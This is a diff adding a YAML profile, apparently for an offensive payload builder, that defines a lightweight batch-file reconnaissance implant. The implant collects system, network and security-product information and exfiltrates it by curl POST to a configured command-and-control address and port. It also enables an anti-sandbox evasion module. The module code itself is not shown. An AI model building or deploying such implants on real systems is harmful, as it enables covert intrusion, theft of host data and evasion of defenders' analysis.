@@ -1,0 +1,21 @@
+name: bat_recon_light
+description: Lightweight batch recon - sysinfo, network, and security products only
+format: batch
+
+core:
+  - core/output
+
+collectors:
+  - collectors/sysinfo
+  - collectors/network
+  - collectors/security_products
+
+exfil: exfil/curl_post
+arch: arch/sequential
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
